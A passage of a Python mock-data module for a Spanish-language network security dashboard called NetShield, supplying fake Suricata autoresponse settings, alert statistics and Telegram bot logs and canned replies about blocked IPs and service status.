    def autoresponse_config() -> dict:
        """Configuración del circuito de respuesta automática."""
        return {
            "enabled": False,
            "auto_trigger": False,  # Si True: trigger automático sin confirmación humana
            "suricata_threshold": 3,   # Mínimo de alertas Suricata para sugerir trigger
            "wazuh_level_required": 10,  # Nivel Wazuh correlacionado requerido
            "actions": {
                "crowdsec_ban": True,    # Agregar ban en CrowdSec
                "mikrotik_block": True,  # Bloquear en Blacklist_Automatica MikroTik
                "default_duration": "24h",
            },
            "last_updated": _ts(60),
            "updated_by": "admin",
        }

    @staticmethod
    def autoresponse_history(limit: int = 10) -> list[dict]:
        """Historial de triggers del circuito de respuesta."""
        return [
            {
                "id": "ar-001",
                "ip": "198.51.100.22",
                "triggered_at": _ts(35),
                "triggered_by": "admin",
                "suricata_alerts_count": 4,
                "wazuh_level": 12,
                "actions_taken": ["crowdsec_ban", "mikrotik_block"],
                "crowdsec_decision_id": "cs-2",
                "mikrotik_rule_id": "*2",
                "duration": "24h",
                "reason": "Suricata: port-scan confirmed by Wazuh alert L12",
                "mock": True,
            },
        ][:limit]

    @staticmethod
    def engine_stats_series(minutes: int = 30) -> list[dict]:
        """Serie temporal para el gráfico de rendimiento del motor (últimos N minutos)."""
        _r = _random_module.Random(99999)
        result = []
        for i in range(minutes):
            t = _NOW - timedelta(minutes=minutes - i)
            pps = _r.randint(800, 1200)
            alerts_pm = _r.randint(0, 3)
            if i in (10, 20):
                alerts_pm += _r.randint(5, 12)
                pps += _r.randint(200, 500)
            result.append({
                "minute": t.strftime("%Y-%m-%dT%H:%M:00"),
                "packets_per_sec": pps,
                "alerts_per_min": alerts_pm,
                "dropped": _r.randint(0, 5),
            })
        return result

    @staticmethod
    def ip_context(ip: str) -> dict:
        """Contexto Suricata para una IP: alertas + flujos."""
        alerts = [a for a in _SURICATA_ALERTS if a["src_ip"] == ip or a["dst_ip"] == ip]
        flows = [f for f in _SURICATA_FLOWS if f["src_ip"] == ip or f["dst_ip"] == ip]
        return {
            "ip": ip,
            "alerts_count": len(alerts),
            "recent_alerts": alerts[:5],
            "flows_count": len(flows),
            "top_signatures": [a["signature"] for a in alerts[:3]],
            "last_seen": alerts[0]["timestamp"] if alerts else None,
        }


# Attach as class-level attribute so usage is MockData.suricata.xxx()
MockData.suricata = _SuricataMockData


# ── Telegram Mock Data ────────────────────────────────────────────────────────

class _TelegramMockData:
    """Mock data for Telegram bot integration."""

    @staticmethod
    def bot_status() -> dict:
        return {
            "connected": True,
            "bot_username": "@netshield_demo_bot",
            "chat_id": "-1001234567890",
            "pending_messages": 0,
            "last_message_at": _ts(5),
            "mock": True,
        }

    @staticmethod
    def report_configs() -> list[dict]:
        return [
            {
                "id": 1,
                "name": "Alerta Crítica Inmediata",
                "enabled": True,
                "trigger": "on_alert",
                "schedule": None,
                "sources": ["wazuh", "crowdsec", "suricata"],
                "min_severity": 12,
                "audience": "technical",
                "include_summary": True,
                "include_charts": False,
                "chat_id": None,
                "last_triggered": _ts(15),
                "created_at": _ts(1440),
                "updated_at": _ts(60),
            },
            {
                "id": 2,
                "name": "Resumen Diario",
                "enabled": True,
                "trigger": "scheduled",
                "schedule": "0 8 * * *",
                "sources": ["wazuh", "mikrotik", "crowdsec", "suricata"],
                "min_severity": 5,
                "audience": "executive",
                "include_summary": True,
                "include_charts": True,
                "chat_id": None,
                "last_triggered": _ts(480),
                "created_at": _ts(10080),
                "updated_at": _ts(4320),
            },
            {
                "id": 3,
                "name": "Reporte Semanal Técnico",
                "enabled": False,
                "trigger": "scheduled",
                "schedule": "0 9 * * 1",
                "sources": ["wazuh", "mikrotik"],
                "min_severity": 3,
                "audience": "compliance",
                "include_summary": True,
                "include_charts": True,
                "chat_id": None,
                "last_triggered": _ts(10080),
                "created_at": _ts(43200),
                "updated_at": _ts(10080),
            },
        ]

    @staticmethod
    def message_logs(limit: int = 20) -> list[dict]:
        logs = [
            {
                "id": 1,
                "direction": "outbound",
                "chat_id": "-1001234567890",
                "message_type": "alert",
                "content_summary": "🚨 Alerta Crítica: Brute-force SSH detectado desde 203.0.113.45",
                "status": "sent",
                "error": None,
                "created_at": _ts(5),
            },
            {
                "id": 2,
                "direction": "outbound",
                "chat_id": "-1001234567890",
                "message_type": "summary",
                "content_summary": "📊 Resumen diario: 45 alertas, 3 IPs bloqueadas, 12 agentes activos",
                "status": "sent",
                "error": None,
                "created_at": _ts(480),
            },
            {
                "id": 3,
                "direction": "inbound",
                "chat_id": "123456789",
                "message_type": "bot_query",
                "content_summary": "¿Cuántas alertas críticas hay hoy?",
                "status": "sent",
                "error": None,
                "created_at": _ts(30),
            },
            {
                "id": 4,
                "direction": "outbound",
                "chat_id": "123456789",
                "message_type": "bot_response",
                "content_summary": "📋 Hay 3 alertas críticas (nivel ≥12) en las últimas 24h...",
                "status": "sent",
                "error": None,
                "created_at": _ts(29),
            },
            {
                "id": 5,
                "direction": "outbound",
                "chat_id": "-1001234567890",
                "message_type": "alert",
                "content_summary": "⚠️ Port-scan detectado: 198.51.100.22 → 5 puertos escaneados",
                "status": "sent",
                "error": None,
                "created_at": _ts(120),
            },
            {
                "id": 6,
                "direction": "outbound",
                "chat_id": "-1001234567890",
                "message_type": "test",
                "content_summary": "✅ Mensaje de prueba desde NetShield Dashboard",
                "status": "sent",
                "error": None,
                "created_at": _ts(1440),
            },
            {
                "id": 7,
                "direction": "inbound",
                "chat_id": "123456789",
                "message_type": "bot_query",
                "content_summary": "Estado del sistema",
                "status": "sent",
                "error": None,
                "created_at": _ts(60),
            },
            {
                "id": 8,
                "direction": "outbound",
                "chat_id": "123456789",
                "message_type": "bot_response",
                "content_summary": "🖥️ Estado: MikroTik ✅ | Wazuh ✅ | CrowdSec ✅ | Suricata ✅",
                "status": "sent",
                "error": None,
                "created_at": _ts(59),
            },
            {
                "id": 9,
                "direction": "outbound",
                "chat_id": "-1001234567890",
                "message_type": "alert",
                "content_summary": "🔴 CrowdSec: IP 185.220.101.50 baneada (Tor exit node, ssh-bf)",
                "status": "failed",
                "error": "Telegram API timeout after 3 retries",
                "created_at": _ts(240),
            },
            {
                "id": 10,
                "direction": "outbound",
                "chat_id": "-1001234567890",
                "message_type": "report",
                "content_summary": "📄 Reporte semanal técnico generado (12 páginas, 3 gráficos)",
                "status": "sent",
                "error": None,
                "created_at": _ts(10080),
            },
        ]
        return logs[:limit]

    @staticmethod
    def send_message(text: str) -> dict:
        return {
            "ok": True,
            "message_id": 12345,
            "chat_id": "-1001234567890",
            "text_preview": text[:100],
            "mock": True,
        }

    @staticmethod
    def bot_query_response(query: str) -> str:
        """Return a mock AI-generated response based on keyword matching."""
        q = query.lower()
        if any(w in q for w in ["alerta", "alert", "crítica", "critical"]):
            return (
                "📋 <b>Alertas en las últimas 24h:</b>\n\n"
                "• <b>3</b> alertas críticas (nivel ≥12)\n"
                "• <b>12</b> alertas altas (nivel 8-11)\n"
                "• <b>45</b> alertas totales\n\n"
                "🔴 Más crítica: <i>Brute-force SSH desde 203.0.113.45</i> (nivel 14)\n"
                "📍 Agente: lubuntu_desk_1\n\n"
                "💡 Recomendación: La IP ya fue bloqueada en MikroTik y CrowdSec."
            )
        if any(w in q for w in ["estado", "status", "sistema", "health"]):
            return (
                "🖥️ <b>Estado del Sistema NetShield:</b>\n\n"
                "• MikroTik: ✅ Online (CPU 23%, RAM 45%)\n"
                "• Wazuh: ✅ 12 agentes activos\n"
                "• CrowdSec: ✅ 5 decisiones activas\n"
                "• Suricata: ✅ IDS mode, 1.2K pps\n\n"
                "⏱️ Uptime MikroTik: 45d 12h 30m\n"
                "📊 Sin incidentes críticos en las últimas 2h."
            )
        if any(w in q for w in ["atacante", "attacker", "ip", "bloqueo", "block"]):
            return (
                "🛡️ <b>Top IPs Atacantes (últimas 24h):</b>\n\n"
                "1. <code>203.0.113.45</code> — 🇨🇳 CN — SSH brute-force (bloqueada ✅)\n"
                "2. <code>198.51.100.22</code> — 🇷🇺 RU — Port scan (bloqueada ✅)\n"
                "3. <code>185.220.101.50</code> — 🇩🇪 DE — HTTP probing, Tor exit (bloqueada ✅)\n\n"
                "📊 Total: 5 IPs bloqueadas en MikroTik + CrowdSec.\n"
                "💡 Todas las IPs tienen score CrowdSec > 75."
            )
        if any(w in q for w in ["mikrotik", "router", "firewall", "tráfico"]):
            return (
                "🔧 <b>Estado MikroTik:</b>\n\n"
                "• CPU: 23% | RAM: 128/256 MB (50%)\n"
                "• Interfaces activas: 4/6\n"
                "• Conexiones activas: 847\n"
                "• Reglas firewall: 12 (3 de Blacklist_Automatica)\n"
                "• Tráfico: ↓ 45 Mbps / ↑ 12 Mbps\n\n"
                "⏱️ Uptime: 45 días, 12 horas"
            )
        if any(w in q for w in ["crowdsec", "decisión", "ban"]):
            return (
                "🛡️ <b>CrowdSec — Resumen:</b>\n\n"
                "• Decisiones activas: 5 (4 ban, 1 captcha)\n"
                "• Alertas 24h: 23\n"
                "• Escenarios activos: ssh-bf, port-scan, http-probing\n"
                "• Bouncers: 1 conectado\n\n"
                "📊 Top país atacante: 🇨🇳 China (35% de alertas)"
            )
        # Default response
        return (
            "ℹ️ <b>NetShield Bot</b>\n\n"
            "Puedo ayudarte con información sobre:\n"
            "• <code>/alertas</code> — Alertas y eventos de seguridad\n"
            "• <code>/estado</code> — Estado de todos los servicios\n"
            "• <code>/atacantes</code> — IPs atacantes y bloqueos\n"
            "• <code>/mikrotik</code> — Estado del router\n"
            "• <code>/crowdsec</code> — Decisiones y escenarios\n\n"
            "💡 También puedes preguntar en lenguaje natural."
        )


# Attach as class-level attribute so usage is MockData.telegram.xxx()
MockData.telegram = _TelegramMockData
